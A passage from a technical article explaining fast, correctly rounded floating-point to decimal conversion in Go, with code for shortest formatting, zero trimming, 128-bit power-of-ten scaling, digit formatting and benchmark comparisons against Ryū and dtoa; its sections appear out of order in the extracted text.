neighbors.\nNormally those neighbors are2ein either direction—the midpoints are(m±½)·2e—sofootprint(f)=2e.\nAt a power of two with an exponent change,\nthe lower midpoint is instead(m−¼)·2e,\nsofootprint(f)=¾·2e.\nThe rounding paradox can only happen for powers of two\nwith this kind of skewed footprint.All that is to say we cannot useFixedWidthwith “the rightn”.\nBut we can use scale directly with “the rightp.”\nSpecifically, we can compute the midpoints betweenfand its floating-point neighbors\nand scale them to obtain the\nminimum and maximum valid choices ford.\nThen we can make the best choice:If one of the validdends in 0, use it after removing trailing zeros.(Choosing the rightpwill allow at most ten consecutive integers,\nso at most will one end in 0.)If there is only one validd, use it.Otherwise there are at least two validd, at least one on each side off;\nuse the correctly rounded one.Here is an example of the first case: one of the validdends in zero.We already saw an example of the second case: only one validd.\nFor numbers with symmetric footprints, that will be the\ncorrectly roundedd.\nAs we saw for numbers with skewed footprints,\nthat may not be the correctly roundedd,\nbut it is still the correct answer.Finally, here is an example of the third case: multiple validd,\nbut none that end in zero.\nNow we should use the correctly rounded one.This sounds great, but how do we determine the rightp?\nWe wantfootprint(f)to allow at least one decimal integer,\nbut at most ten, meaning1≤footprint(f)<10.\nLuckily, we can hit that target exactly.For a symmetric footprint:footprint(f)·10p∈[1,10)2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/2e)·[1,10)[isolatingp]p∈−(log102)·e+[0,1)[takinglog]p∈−((log102)·e−[0,1))[regrouping]p=−⌊(log102)·e⌋[pisaninteger]For a skewed footprint:footprint(f)·10p∈[1,10)¾·2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/(¾·2e))·[1,10)[isolatingp]p∈−(log10¾+(log102)·e)+[0,1)[takinglog]p∈−(log10¾+(log102)·e−[0,1))[regrouping]p=−⌊log10¾+(log102)·e⌋[pisaninteger]For the symmetric footprint, we can uselog10Pow2,\nbut for the skewed footprint, we need a new approximation:// skewed computes the skewed footprint of m * 2**e,// which is ⌊log₁₀ 3/4 * 2**e⌋ = ⌊e*(log₁₀ 2)-(log₁₀ 4/3)⌋.func skewed(e int) int {\n\treturn (e*631305 - 261663) >> 21\n}fpfmt/fpfmt.go:234,238We should worry about a footprint with decimal width exactly 1,\nsince iffhad an odd mantissa,\nthe midpoints would be excluded.\nIn that case, if the decimals were the exact midpoints,\nthere would be no decimal between them,\nmaking the conversion invalid.\nBut it turns out we should not worry too much.\nFor a skewed footprint,¾·2e·10pcan never be exactly 1,\nbecause nothing can divide away the 3.\nFor a symmetric footprint,2e·10p=1can only happen fore=p=0,\nbut then scaling is a no-op,\nso that the decimal integers are exactly the binary integers.\nThe non-integer midpoints map to non-integer decimals.When we compute the decimal equivalents of the midpoints,\nwe will use ceiling and floor instead of rounding them,\nto make sure the integer results are valid decimal answers.\nIf the mantissamis odd, we will nudge the unrounded forms\ninward slightly before taking the ceiling or floor,\nsince rounding will be away fromm.The Go code is:// Short computes the shortest formatting of f,// using as few digits as possible that will still round trip// back to the original float64.func Short(f float64) (d uint64, p int) {\n\tconst minExp = -1085\n\n\tm, e := unpack64(f)\n\n\tvar min uint64\n\tz := 11// extra zero bits at bottom of m; 11 for 53-bit mif m == 1<<63 && e > minExp {\n\t\tp = -skewed(e + z)\n\t\tmin = m - 1<<(z-2)// min = m - 1/4 * 2**(e+z)} else {\n\t\tif e < minExp {\n\t\t\tz = 11 + (minExp - e)\n\t\t}\n\t\tp = -log10Pow2(e + z)\n\t\tmin = m - 1<<(z-1)// min = m - 1/2 * 2**(e+z)}\n\tmax := m + 1<<(z-1)// max = m + 1/2 * 2**(e+z)odd := int(m>>z) & 1\n\n\tpre := prescale(e, p, log2Pow10(p))\n\tdmin := uscale(min, pre).nudge(+odd).ceil()\n\tdmax := uscale(max, pre).nudge(-odd).floor()\n\n\tif d = dmax / 10; d*10 >= dmin {\n\t\treturn trimZeros(d, -(p - 1))\n\t}\n\tif d = dmin; d < dmax {\n\t\td = uscale(m, pre).round()\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:198,232Notice that this algorithm requires either two or three calls touscale.\nWhen the number being printed has only one valid representation\nof the shortest length, we avoid the third call touscale.\nAlso notice that theprescaleresult is shared by all three calls.Whenm=263,min<263,\nmeaning it won’t be left shifted as far as possible\nduring the call touscale.\nAlthough we could detect this case and calluscalewith2·minande−1,\nusingminunmodified is fine:\nit is still shifted enough that the bitsuscaleneeds to return will stay in the high 64 bits of the 192-bit product,\nand using the sameelets us use the sameprescalework for all three calls.Trimming ZerosThetrimZerosfunction used inShortremoves any trailing zeros from its argument,\nupdating the decimal power. An unoptimized version is:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tif x%10 != 0 {\n\t\treturn x, p\n\t}\n\tx /= 10\n\tp += 1\n\n\tif x%100000000 == 0 {\n\t\tx /= 100000000\n\t\tp += 8\n\t}\n\tif x%10000 == 0 {\n\t\tx /= 10000\n\t\tp += 4\n\t}\n\tif x%100 == 0 {\n\t\tx /= 100\n\t\tp += 2\n\t}\n\tif x%10 == 0 {\n\t\tx /= 10\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/unopt/fpfmt.go:227,254The initial removal of a single zero gives an early return for\nthe common case of having no zeros.\nOtherwise, the code makes four additional checks that\ncollectively remove up to 16 more zeros.\nFor outputs with many zeros, these four checks run faster\nthan a loop removing one zero at a time.When compiling this code,\nthe Go compiler reduces the remainder checks to multiplications\nusing the following well-known optimization.\nAn exactuint64divisionx/cwherexmodc=0can be implemented byx·mwheremis theuint64multiplicative inverse ofc, meaningm·cmod264=1:\nSincecis also the multiplicative inverse ofm,x·mis\nlossless—all the exact multiples ofcmap to all of[0,(264−1)/c]—so\nthe non-multiples are forced to map to larger values.\nThis observation gives a quick test for whetherxis an exact multiple ofc:\ncheck whetherx·m≤(264−1)/c.Only oddchave multiplicative inverses modulo powers of two,\nso even divisors require more work.\nTo compute an exact divisionx/(c<<s),\nwe can use(x/c)>>sinstead.\nTo check for remainder, we need to check that those lowsbits are all zero before we shift them away.\nWe can merge that check with the range check by rotating those bits\ninto the high part instead of discarding them:\ncheck whetherx·m↻>s≤(264−1)/c,\nwhere↻>is right rotate.The Go compiler does this transformation automatically\nfor theifconditions intrimZeros,\nbut inside theifbodies, it does not reuse the\nexact quotient it just computed.\nI considered changing the compiler to recognize that pattern,\nbut instead I wrote out the remainder check by hand\nin the optimized version, allowing me to reuse the computed exact quotients:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tconst (\n\t\tmaxUint64 = ^uint64(0)\n\t\tinv5p8    = 0xc767074b22e90e21// inverse of 5**8inv5p4    = 0xd288ce703afb7e91// inverse of 5**4inv5p2    = 0x8f5c28f5c28f5c29// inverse of 5**2inv5      = 0xcccccccccccccccd// inverse of 5)// Cut 1 zero, or else return.if d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t} else {\n\t\treturn x, p\n\t}// Cut 8 zeros, then 4, then 2, then 1.if d := bits.RotateLeft64(x*inv5p8, -8); d <= maxUint64/100000000 {\n\t\tx = d\n\t\tp += 8\n\t}\n\tif d := bits.RotateLeft64(x*inv5p4, -4); d <= maxUint64/10000 {\n\t\tx = d\n\t\tp += 4\n\t}\n\tif d := bits.RotateLeft64(x*inv5p2, -2); d <= maxUint64/100 {\n\t\tx = d\n\t\tp += 2\n\t}\n\tif d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/fpfmt.go:240,278This approach to trimming zeros is from Dragonbox.\nFor more about the general optimization,\nsee Warren’sHacker’s Delight[34],\nsections 10-16 and 10-17.Fast, Accurate ScalingThe conversion algorithms we examined are nice and simple.\nFor them to be fast,uscaleneeds to be fast while remaining correct.\nAlthough multiplication by2ecan be implemented by shifts,uscalecannot actually compute or multiply by10p—that would take too long whenpis a large positive or negative number.\nInstead, we can approximate10pas a floating-point numberpm·2pewith a 128-bit mantissa,\nlooked up in a table indexed byp.\nSpecifically, we will usepe=⌊log210p⌋−127andpm=⌈10p/2pe⌉,\nensuring thatpm∈[2127,2128).\nWe will write a separate program to generate this table.\nIt emits Go code definingpow10Min,pow10Max, andpow10Tab:pow10Tab[0]holds the entry forp=pow10Min.\nTo figure out how big the table needs to be,\nwe can analyze the three functions we just wrote.FixedWidthconverts floating-point to decimal.\nIt needs to calluscalewith a 53-bitx,e∈[−1137,960], andp∈[−307,341].Shortalso converts floating-point to decimal.\nIt needs to calluscalewith a 55-bitx,e∈[−1137,960], andp∈[−292,324].Parseconverts decimal to floating-point.\nIt needs to calluscalewith a 64-bitxandp∈[−343,289].\n(Outside that range ofp,Parsecan return 0 or infinity.)So the table needs to provide answers forp∈[−343,341].If10p≈pm·2pe, thenx·2e·10p≈x·pm·2e+pe.\nIn all of our algorithms, the result ofuscalewas always small—at most 64 bits.\nSincepmis 128 bits andx·pmis even bigger,e+pemust be negative,\nso this computation is(x*pm) >> -(e+pe).\nBecause of the ceiling,pmmay be too large by an errorε0<1,\nsox·pmmay be too large by an errorε1=x·ε0<x.\nTo round exactly, we care whether any of the shifted bits is 1,\nbutε1may change the lowbits(x)bits,\nso we can’t trust them.\nInstead, we will throw them away.\nand use only the upper bits to compute our unrounded number.\nThat is the entire idea!Now let’s look at the implementation.\nTheprescalefunction returns ascalerwithpmand a shift counts:// A scaler holds derived scaling constants for a given e, p pair.type scaler struct {\n\tpm pmHiLo\n\ts  int\n}// A pmHiLo represents hi<<64 + lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/unopt/fpfmt.go:256,266We want the shift count to reserve two extra bits for the unrounded\nrepresentation and to apply to the top 64-bit word of the 192-bit product,\nwhich gives this formula:s=−(e+pe)−2−(192−64)=−(e+⌊log210p⌋−127)−2−128=−(e+⌊log210p⌋+3)That translates directly to Go:// prescale returns the scaling constants for e, p.// lp must be log2Pow10(p).func prescale(e, p, lp int) scaler {\n\treturn scaler{pm: pow10Tab[p-pow10Min], s: -(e + lp + 3)}\n}fpfmt/fpfmt.go:292,296Inuscale, since the caller left-justifiedxto 64 bits,\ndiscarding the lowbits(x)bits means discarding the\nlowest 64 bits of the product, which we skip computing entirely.\nThen we use the middle 64-bit word and the lowsbits\nof the upper word to set the sticky bit in the result.// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\tmid, carry := bits.Add64(mid, mid2, 0)\n\thi += carry\n\tsticky := bool2[unrounded](mid != 0 || hi&((1<<c.s)-1) != 0)\n\treturn unrounded(hi>>c.s) | sticky\n}fpfmt/unopt/fpfmt.go:302,312It is mind-boggling that this works, but it does.\nOf course, you shouldn’t take my word for it.\nWe have to prove it correct.Sketch of a Proof of Fast ScalingTo prove that our fastuscalealgorithm is correct,\nthere are three cases: small positivep,\nsmall negativep,\nand largep.\nThe actual proof, especially for largep,\nis non-trivial,\nand the details are quite a detour from\nour fast scaling implementations,\nso this section only sketches the basic ideas.\nFor the details, see the accompanying post, “Fast Unrounded Scaling: Proof by Ivy.”Remember from the previous section thatpm=⌈10p/2pe⌉=10p/2pe+ε0for someε0<1.\nSince10p=5p·2p,pm’s 128 bits need only represent the5ppart; the2pcan always be handled bype.Forp∈[0,27),5pfits in the top 64 bits of the 128-bitpm.\nSincepmis exact,\nthe only possible error is introduced by discarding the bottombits(x)bits.\nSince the bottom 64 bits ofpmare zero,\nthe bits we discard are all zero.\nSouscaleis correct for small positivep.Forp∈[−27,−1],x·pmis approximating division by5−p(remember that−pis a positive number!).\nThe 128-bit approximation is precise enough that whenxis a\nmultiple of5−p, only the lowestbits(x)bits are non-zero;\ndiscarding them keeps the unrounded form exact.\nAnd whenxis not a multiple of5−p,\nthe result has a fractional part that must be at least1/5−paway from an integer.\nThat fractional separation is much larger than the maximum error in the product,\nso the high bits saved in the unrounded form are correct;\nthe fraction is also repeating, so that there is guaranteed\nto be a 1 bit to cause the unrounded form to be marked inexact.\nSouscaleis correct for small negativep.Finally, we must handle largep, which always have a non-zero error\nand therefore should always return unrounded numbers marked inexact\n(with the sticky bit set to 1).\nConsider the effect of adding a small error to the idealized “correct”x·10p/2pe,\nproducingx·pm.\nThe error is at most 64 bits.\nAdding that error to the 192-bit product can certainly affect\nthe low 64 bits, and it may also generate a carry out of the low 64\ninto the middle 64 bits.\nThe carry turns 1 bits into 0 bits from right to left\nuntil it hits a 0 bit;\nthat first 0 bit becomes a 1, and the carry stops.\nThe key insight is that seeing a 1 in the middle bits\nis proof that the carry did not reach the high bits,\nso the high bits are correct.\n(Seeing a 1 in the middle bits also ensures that\nthe unrounded form is marked inexact, as it must be,\neven though we discarded the low bits.)\nUsing a program backed by careful math, we can analyze all thepmin our table,\nshowing that every possiblex·pmhas a 1 in the middle bits.\nSouscaleis correct for largep.Omit Needless MultiplicationsWe have a fast and correctuscale, but we can make it faster\nnow that we understand the importance of carry bits.\nThe idea is to compute the high 64 bits of the product\nand then use it directly whenever possible, avoiding the computation\nof the remaining 64 bits at all.\nTo make this work, we need the high 64 bits to be rounded up,\na ceiling instead of a floor.\nSo we will change thepmHiLofrom representinghi·264+lotohi·264−lo.// A pmHiLo represents hi<<64 - lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/fpfmt.go:280,284The exact computation using this form would be:hi, mid := bits.Mul64(x, c.pm.hi)\nmid2, lo := bits.Mul64(x, c.pm.lo)\nmid, carry := bits.Sub64(mid, mid2, bool2[uint64](lo > 0))\nhi -= carry\nreturn unrounded(hi >> c.s) | bool2[unrounded](hi&((1<<c.s)-1) != 0 || mid != 0)The 128-bit productx·pm.hicomputed on the first line\nmay be too big by an error of up to264,\nwhich may or may not affect the high 64 bits;\nThe middle three lines correct the product,\npossibly subtracting 1 fromhi.\nLike in the proof sketch, if any of the bottomsbits of the approximatehiis a 1 bit,\nthat 1 bit would stop the subtracted carry from\naffecting the higher bits, indicating that we don’t need to correct the product.Using this insight, the optimizeduscaleis:// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tsticky := uint64(1)\n\tif hi&(1<<(c.s&63)-1) == 0 {\n\t\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\t\tsticky = bool2[uint64](mid-mid2 > 1)\n\t\thi -= bool2[uint64](mid < mid2)\n\t}\n\treturn unrounded(hi>>c.s | sticky)\n}fpfmt/fpfmt.go:298,310The fix-up looks different from the exact computation above\nbut it has the same effect.\nWe don’t need the actual final value ofmid, only the carry\nand its effect on the sticky bit.On some systems, notably x86-64,bits.Mul64computes both results in a single instruction.\nOn other systems, notably ARM64,bits.Mul64must use two different instructions;\nit helps on those systems to write the code this way,\noptimizing away the computation for the low half ofx·pm.lo.The more bits that are being shifted out ofhi,\nthe more likely it is that a 1 bit is being shifted out,\nso that we have an answer after only the firstbits.Mul64.\nWhenShortcallsuscale, it passes twoxthat\ndiffer only in a single bit\nand multiplies them by the samepm.hi.\nWhile one of them might clear the lowsbits ofhi,\nthe other is unlikely to also clear them,\nso we are likely to hit the fast path at least once,\nif not twice.\nIn the case whereShortcallsuscalethree times,\nwe are likely to hit the fast path at least twice.\nThis optimization means that, most of the time, auscaleis implemented by a single wide multiply.\nThis is the main reason thatShortruns faster than\nRyū, Schubfach, and Dragonbox, as we will see in the next section.PerformanceI promised these algorithms would be simpleandfast.\nI hope you are convinced about simple.\n(If not, keep in mind that the implementations in widespread\nuse today are far more complicated!)\nNow it is time to evaluate ‘fast’\nby comparing against other implementations.\nAll the other implementations are written in C or C++ and compiled by a C/C++ compiler.\nTo isolate compilation differences,\nI translated the Go code to C and measured\nboth the Go code and the C translation.I ran the benchmarks on two systems.Apple M4 (2025 MacBook Air ‘Mac16,12’), 32 GB RAM, macOS 26.1, Apple clang 17.0.0 (clang-1700.6.3.2)AMD Ryzen 9 7950X, 128 GB RAM, Linux 6.17.9 and libc6 2.39-0ubuntu8.6, Ubuntu clang 18.1.3 (1ubuntu1)Both systems used Go 1.26rc1.\nThe full benchmark code is in thersc.io/fpfmtpackage.Printing TextReal implementations generate strings, so we need to write\ncode to convert the integers we have been returning into digit sequences,\nlike this:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tfor nd := len(a) - 1; nd >= 0; nd-- {\n\t\ta[nd] = byte(u%10 + '0')\n\t\tu /= 10\n\t}\n}fpfmt/unopt/fpfmt.go:368,376Unfortunately, if we connect our fastFixedWidthandShortto this\nversion offormatBase10, benchmarks spend most of their time in the formatting loop.\nThere are a variety of clever ways to speed up digit formatting.\nFor our purposes, it suffices to use the old trick of\nsplitting the number into two-digit chunks and\nthen converting each chunk by\nindexing a 200-byte lookup table (more precisely, a “lookup string”) of all 2-digit values from 00 to 99:// i2a is the formatting of 00..99 concatenated,// a lookup table for formatting [0, 99].const i2a = \"00010203040506070809\" +\n\t\"10111213141516171819\" +\n\t\"20212223242526272829\" +\n\t\"30313233343536373839\" +\n\t\"40414243444546474849\" +\n\t\"50515253545556575859\" +\n\t\"60616263646566676869\" +\n\t\"70717273747576777879\" +\n\t\"80818283848586878889\" +\n\t\"90919293949596979899\"fpfmt/fpfmt.go:353,364Using this table and unrolling the loop to allow the\ncompiler to optimize away bounds checks, we end up withformatBase10:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tnd := len(a)\n\tfor nd >= 8 {// Format last 8 digits (4 pairs).x3210 := uint32(u % 1e8)\n\t\tu /= 1e8\n\t\tx32, x10 := x3210/1e4, x3210%1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\tx3, x2 := (x32/100)*2, (x32%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\ta[nd-5], a[nd-6] = i2a[x2+1], i2a[x2]\n\t\ta[nd-7], a[nd-8] = i2a[x3+1], i2a[x3]\n\t\tnd -= 8\n\t}\n\n\tx := uint32(u)\n\tif nd >= 4 {// Format last 4 digits (2 pairs).x10 := x % 1e4\n\t\tx /= 1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\tnd -= 4\n\t}\n\tif nd >= 2 {// Format last 2 digits.x0 := (x % 1e2) * 2\n\t\tx /= 1e2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\tnd -= 2\n\t}\n\tif nd > 0 {// Format final digit.a[0] = byte('0' + x)\n\t}\n}fpfmt/fpfmt.go:366,406This is more code than I’d prefer, but it is at least straightforward.\nI’ve seen much more complex versions.WithformatBase10, we can buildFmt, which formats in standard exponential notation:// Fmt formats d, p into s in exponential notation.// The caller must pass nd set to the number of digits in d.// It returns the number of bytes written to s.func Fmt(s []byte, d uint64, p, nd int) int {// Put digits into s, leaving room for decimal point.formatBase10(s[1:nd+1], d)\n\tp += nd - 1// Move first digit up and insert decimal point.s[0] = s[1]\n\tn := nd\n\tif n > 1 {\n\t\ts[1] = '.'\n\t\tn++\n\t}// Add 2- or 3-digit exponent.s[n] = 'e'\n\tif p < 0 {\n\t\ts[n+1] = '-'\n\t\tp = -p\n\t} else {\n\t\ts[n+1] = '+'\n\t}\n\tif p < 100 {\n\t\ts[n+2] = i2a[p*2]\n\t\ts[n+3] = i2a[p*2+1]\n\t\treturn n + 4\n\t}\n\ts[n+2] = byte('0' + p/100)\n\ts[n+3] = i2a[(p%100)*2]\n\ts[n+4] = i2a[(p%100)*2+1]\n\treturn n + 5\n}fpfmt/fpfmt.go:312,345When callingFmtwith aFixedWidthresult, we know the digit countndalready.\nFor aShortresult, we can compute the digit count easily from the bit length:// Digits returns the number of decimal digits in d.func Digits(d uint64) int {\n\tnd := log10Pow2(bits.Len64(d))\n\treturn nd + bool2[int](d >= uint64pow10[nd])\n}fpfmt/fpfmt.go:347,351Fixed-Width PerformanceTo evaluate fixed-width printing,\nwe need to decide which floating-point values to convert.\nI generated 10,000 uint64s in the range[1,263−252)and used them as\nfloat64 bit patterns.\nThe limited range avoids negative numbers, infinities, and NaNs.\nThe benchmarks all use Go’sChaCha8-based generatorwith a fixed seed for reproducibility.\nTo reduce timing overhead, the benchmark builds an array of 1000 copies of the value\nand calls a function that converts every value in the array in sequence.\nTo reduce noise, the benchmark times that function call 25 times and uses the median timing.\nWe also have to decide how many digits to ask for:\nlonger sequences are more difficult.\nAlthough I investigated a wider range, in this post I’ll show\ntwo representative widths: 6 digits (Cprintf’s default) and 17 digits\n(the minimum to guarantee accurate round trips, so widely used).The implementations I timed are:dblconv: Loitsch’sdouble-conversion library, using theToExponentialfunction.\nThis library, used in Google Chrome,\nimplements a handful of special cases for small binary exponents\nand falls back to a bignum-based printer for larger exponents.dmg1997: Gay’sdtoa.c,archived in 1997.\nFor our purposes, this represents Gay’s original C implementation\ndescribed in his technical report from 1990  [11].\nI confirmed that this 1997 snapshot runs at the same speed as\n(and has no significant code changes compared to)\nanother copy dating back to May 1991 or earlier.dmg2017: Gay’sdtoa.c,archived in 2017.\nIn 2017, Gay published an updated version ofdtoa.cthat usesuint64math and\na table of 96-bit powers of ten. It is significantly faster than the original version (see below).\nIn November 2025, I confirmed that the latest version runs at the same speed as this one.libc:\nThe C standard library conversion usingsprintf(\"%.*e\", prec-1).\nThe conversion algorithm varies by C library.\nThe macOS C library seems to wrap a pre-2017 version ofdtoa.c,\nwhile Linux’s glibc uses its own bignum-based code.\nIn general the C library implementations have not kept pace\nwith recent algorithms and are slower than any of the others.ryu: Adams’sRyū library, using thed2exp_bufferedfunction.\nIt uses the Ryū Printf algorithm [3].uscale: The unrounded scaling approach, using the Go code in this post.uscalec: A C translation of the unrounded scaling Go code.Here is a scatterplot showing the times required to formatfto 17 digits,\nrunning on the Linux system:(Click on any of the graphs in this post for a larger view.)The X axis is the log of the floating point inputf,\nand\nthe Y axis is the time required for a single conversion of the given input.\nThe scatterplot makes many things clear. For example, it is obvious that\nthere are two kinds of implementations.\nThose that use bignums take longer for large exponents and\nhave a “winged” scatterplot,\nwhile those that avoid bignums run at a mostly constant speed across\nthe entire exponent range.\nThe scatterplot also highlights many interesting data-dependent patterns in the timings,\nmost of which I have not investigated.\nA friend remarked that you could probably spend a whole career\nanalyzing the patterns in this one plot.For our purposes, it would help to have a clearer comparison\nof the speed of the different algorithms.\nThe right tool for that is a plot of the cumulative distribution function (CDF),\nwhich looks like this:Now time is on the X axis (still log scale), and the Y axis plots what\nfraction of the inputs ran in that time or less.\nFor example, we can see that dblconv’s fast path applies to most inputs,\nbut its slow path is much slower than Linux glibc or\neven Gay’s original C library.The CDF only plots the middle 99.9% of timings\n(dropping the 0.05% fastest and slowest),\nto avoid tails caused by measurement noise.\nIn general, measurements are noisier on the Mac because\nARM64 timers only provide ~20ns precision,\ncompared to the x86’s sub-nanosecond precision.Here are the scatterplots and CDFs for 6-digit output on the two systems: [The notation[a,b)is ahalf-open interval, which includesabut notb.\nIn contrast, theclosed interval[a,b]includes bothaandb.\nWe writex∈[a,b)orx∈[a,b]to say thatxis in that interval.\nUsing this notation,m∈[252,253)means252≤m<253.]In addition to limiting the mantissa size, we must also limit the exponent,\nto keep the overall number a fixed size.\nFor float64s, assumingm∈[252,253), the exponente∈[−1074,971].A float64 consists of 1 sign bit, 11 exponent bits, and 52 mantissa bits.\nThenormal11-bit exponent encodings0x001through0x3fedenotee=−1074throughe=971.\nFor those, the mantissam∈[252,253),\nand it is encoded into only 52 bits by omitting the leading 1 bit.\nThe special exponent encoding0x3ffis used for infinity and not-a-number.\nThat leaves the encoding0x000, which is also special.\nIt denotese=−1074(like0x001does)\nbut with mantissasm∈[0,252)without an implicit leading 1.\nThesesubnormalsordenormalized numbers[8]\ncontinue the fixed-point2−1074scale down to zero,\nwhich ends up encoded (not coincidentally) as 64 zero bits.Other definitions of floating point numbers use different interpretations.\nFor example the IEEE754 standard usesm∈[1,2)withe∈[−1023,1023],\nwhile the C standard libaryfrexpfunction usesm∈[½,1)withe∈[−1022,1024].\nBoth of these choices makemitself a fixed-point number instead of an integer.\nOur integer definition lets us use integer math.\nThese interpretations are all equivalent and differ only by a constant added toe.This description of float64s applies to float32s as well, but with different constants. This table summarizes the two encodings:float32float64sign bits11encoded mantissa bits2352encoded exponent bits811exponent range form∈[1,2)[−127,127][−1023,1023]exponent range for integerm[−150,104][−1074,971]normal numbers[223,224)·2[−150,104][252,253)·2[−1074,971]subnormal numbers[0,223)·2−150[0,252)·2−1074exponent range for 64-bitm[−190,64][−1085,960]normal numbers[263,264)·2[−190,64][263,264)·2[−1085,960]subnormal numbers[0,263)·2−190[0,263)·2−1085To convert a float64 to its bits, we use Go’smath.Float64bits.// unpack64 returns m, e such that f = m * 2**e.// The caller is expected to have handled 0, NaN, and ±Inf already.// To unpack a float32 f, use unpack64(float64(f)).func unpack64(f float64) (uint64, int) {\n\tconst shift = 64 - 53\n\tconst minExp = -(1074 + shift)\n\tb := math.Float64bits(f)\n\tm := 1<<63 | (b&(1<<52-1))<<shift\n\te := int((b >> 52) & (1<<shift - 1))\n\tif e == 0 {\n\t\tm &^= 1 << 63\n\t\te = minExp\n\t\ts := 64 - bits.Len64(m)\n\t\treturn m << s, e - s\n\t}\n\treturn m, (e - 1) + minExp\n}fpfmt/fpfmt.go:23,39To convert back, we use Go’smath.Float64frombits.// pack64 takes m, e and returns f = m * 2**e.// It assumes the caller has provided a 53-bit mantissa m// and an exponent that is in range for the mantissa.func pack64(m uint64, e int) float64 {\n\tif m&(1<<52) == 0 {\n\t\treturn math.Float64frombits(m)\n\t}\n\treturn math.Float64frombits(m&^(1<<52) | uint64(1075+e)<<52)\n}fpfmt/fpfmt.go:41,49[Other presentations use “fraction” and “significand” instead of “mantissa”.\nThis post uses mantissa for consistency with my 2011 post\nand because I generally agree with Agatha Mallett’s excellent\n“In Defense of ‘Mantissa’”.]Unrounded NumbersFloating-point operations are defined as if computed exactly to infinite precision\nand then rounded to the nearest actual floating-point number,\nbreaking ties by rounding to an even mantissa.\nOf course, real implementations don’t use infinite precision;\nthey only keep enough precision to round properly.\nWe will use the same idea.\nIn our algorithms, we want the scaling operation to eventually evaluate to an integer,\nbut we want to give the caller control over the rounding step.\nSo instead of returning an integer, we will return anunrounded number,\nwhich contains all the information needed to round it in a variety of ways.The unrounded form of any real numberx, which we will write as as⟨x⟩,\nis the truncated integer part ofxfollowed by two more bits.\nThose bits indicate (1) whether the fractional part ofxwas at least ½, and (2) whether the fractional part was not exactly 0 or ½.\nIf you think ofxas a real number written in binary, the first extra bit is the bit immediately after the “binary point”—the bit that represents2−1, aka the ½ bit—and the second extra bit is the OR of all the bits after the ½ bit.This definition applies even to numbers that require an infinite binary representation.\nFor example, just as 1/3 requires an infinite decimal representation ‘0.333...’,\n1.6 requires an infinite binary representation ‘1.1001100110011...’.\nThe unrounded version⟨1.6⟩is finite: ‘1.11’.\nBut instead of reading unrounded numbers in binary,\nlet’s print⟨x⟩as‘n.hs’wherenis the integer part⟨x⟩>>2,his 0 or 5, andsis ‘+’ when the second bit is 1.\nThen⟨1.6⟩is written ‘1.5+’.⟨x⟩=⌊4x⌋|(4x≠⌊4x⌋)⟨6exactly⟩=24=‘6.0’⟨6.000001⟩=25=‘6.0+’⟨6.499999⟩=25=‘6.0+’⟨6.5exactly⟩=26=‘6.5’⟨6.500001⟩=27=‘6.5+’⟨6.999999⟩=27=‘6.5+’⟨7exactly⟩=28=‘7.0’Let’s implement unrounded numbers in Go.type unrounded uint64\n\nfunc unround(x float64) unrounded {\n\treturn unrounded(math.Floor(4*x)) | bool2[unrounded](math.Floor(4*x) != 4*x)\n}\n\nfunc (u unrounded) String() string {\n\treturn fmt.Sprintf(\"⟨%d.%d%s⟩\", u>>2, 5*((u>>1)&1), \"+\"[1-u&1:])\n}fpfmt/fpfmt.go:52,61Thebool2function converts a boolean to an integer.\n(The Go compiler will implement this using an inlined conditional move.)// bool2 converts b to an integer: 1 for true, 0 for false.func bool2[T ~int | ~uint64](b bool) T {\n\tif b {\n\t\treturn 1\n\t}\n\treturn 0\n}fpfmt/fpfmt.go:15,21We won’t use theunroundconstructor in our actual code, but it’s helpful for playing.\nFor example, we can try the examples we just saw:row(\"x\", \"raw\", \"str\")\nfor _, x := range []float64{6, 6.001, 6.499, 6.5, 6.501, 6.999, 7} {\n    u := unround(x)\n    row(x, uint64(u), u)\n}\ntable()x      raw  str\n6      24   ⟨6.0⟩\n6.001  25   ⟨6.0+⟩\n6.499  25   ⟨6.0+⟩\n6.5    26   ⟨6.5⟩\n6.501  27   ⟨6.5+⟩\n6.999  27   ⟨6.5+⟩\n7      28   ⟨7.0⟩The unrounded form⟨x⟩holds the information needed by all the usual rounding operations.\nAdding 0, 1, 2, or 3 and then dividing by four (or shifting right by two) yields: floor, round with ½ rounding down, round with ½ rounding up, and ceiling.\nIn floating-point math, we want to round with ½ rounding to even, 